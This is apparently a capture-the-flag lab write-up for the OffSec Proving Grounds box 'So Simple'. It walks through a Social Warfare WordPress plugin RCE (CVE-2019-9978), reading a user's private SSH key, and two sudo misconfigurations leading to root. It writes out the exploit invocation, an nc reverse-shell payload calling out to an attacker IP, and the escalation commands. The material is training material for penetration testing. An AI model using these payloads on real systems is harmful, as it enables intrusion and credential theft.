---
title: "So Simple"
description: "OffSec Proving Grounds So Simple — an outdated Social Warfare WordPress plugin gives unauthenticated RCE (CVE-2019-9978), then a leaked SSH key and a three-hop sudo chain lead to root."
tags:
  - Proving Grounds
  - OffSec
  - Web
  - WordPress
  - Sudo
  - Intermediate
---

# So Simple

**Box info:** Difficulty: Intermediate · OS: Linux (Ubuntu) · Focus: WordPress plugin RCE (Social Warfare, CVE-2019-9978), SSH key theft, chained sudo privilege escalation across three accounts.

A WordPress install running the long-abandoned **Social Warfare** plugin is vulnerable to an unauthenticated remote code execution bug. The resulting `www-data` shell leaks a private SSH key for one user, who has sudo rights to run a service as a second user, who in turn has sudo rights to a root-owned script path that doesn't exist yet — letting the attacker create it themselves.

---

## 1. Reconnaissance (nmap)

```bash
nmap -sC -sV -p- --min-rate=1000 -oA nmap/soSimple 192.168.158.78
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
```

## 2. Enumeration

```bash
ffuf -u "http://192.168.158.78/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r
```

```text
wordpress               [Status: 200]
```

`wpscan` against `/wordpress/` identifies the CMS version and, critically, an outdated plugin with a public remote code execution advisory:

```bash
wpscan --url http://192.168.158.78/wordpress/ --enumerate --api-token <token>
```

```text
WordPress version 5.4.2 identified
social-warfare
 | Version: 3.5.0 (100% confidence)
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     UUID: 7b412469-cc03-4899-b397-38580ced5618
 |     Fixed in: 3.5.3
```

**Social Warfare ≤ 3.5.2** (CVE-2019-9978) lets an unauthenticated attacker point the plugin's `swp_debug=load_options` / `get_user_options` AJAX endpoint at an attacker-hosted "options" file, which the plugin then executes as PHP — a classic remote-file-inclusion-to-RCE chain.

![GitHub PoC repository for CVE-2019-9978, the Social Warfare plugin RCE](images/so-simple/image.png)

## 3. Foothold — Social Warfare unauthenticated RCE (CVE-2019-9978)

A local HTTP server hosts the malicious "options" payload, and the public exploit script delivers it to the target, which fetches and executes it:

```bash
python3 -m http.server 8000
```

```bash
python3 CVE-2019-9978.py -t http://192.168.158.78/wordpress/ --payload-uri http://192.168.45.231:8000/payload.txt
```

```text
[>] Sending Payload to System!
[*] Received Response From Server!
[<] Received:
root:x:0:0:root:/root:/bin/bash
...
max:x:1000:1000:roel:/home/max:/bin/bash
steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash
```

Command execution confirmed, the same vulnerable endpoint is used to deliver a full reverse shell through the `payload.txt` the exploit fetches:

```text
<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.231 8443 >/tmp/f')</pre>
```

```bash
nc -lvnp 8443
```

```text
connect to [192.168.45.231] from (UNKNOWN) [192.168.158.78] 45382
www-data@so-simple:/var/www/html/wordpress/wp-admin$
```

### User flag and SSH key theft

```bash
cd /home/max
cat local.txt
```

```text
<LOCAL_REDACTED>
```

`www-data` can still read into `max`'s home directory, including its `.ssh` folder:

```bash
cat /home/max/.ssh/id_rsa
```

The private key is pulled out and used to log in directly as `max` over SSH with a proper TTY, rather than fighting the webshell.

## 4. Privilege escalation — chaining sudo across three accounts

### max → steven

```bash
sudo -l
```

```text
User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

`service` can be told to run an arbitrary path as its first argument (there is no strict validation that it's a real init script), so a relative path to a shell is substituted:

```bash
sudo -u steven /usr/sbin/service ../../bin/sh
```

```text
$ whoami
steven
```

### steven → root

```bash
sudo -l
```

```text
User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

The target script doesn't actually exist on disk yet, and `steven` has write access to the (empty) `/opt` directory — so the privilege escalation is simply to create the missing script, with whatever content is wanted, before sudo runs it as root:

```bash
mkdir -p /opt/tools
echo -e '#!/bin/bash\nbash' > /opt/tools/server-health.sh
chmod +x /opt/tools/server-health.sh
sudo /opt/tools/server-health.sh
```

## 5. Root / proof.txt

```text
root@so-simple:/opt/tools# cd /root
root@so-simple:~# cat proof.txt
```

```text
<PROOF_REDACTED>
```

---

## Takeaway

A single outdated, long-unmaintained WordPress plugin (Social Warfare) was all it took for unauthenticated RCE. From there the box was a three-hop sudo chain: a loosely-validated `service` wrapper handed over a second account, and a sudo rule pointing at a script that simply didn't exist yet handed over root — sudo's `NOPASSWD` guarantees only that the *named path* runs as root, never that the path's contents are trustworthy or even present.
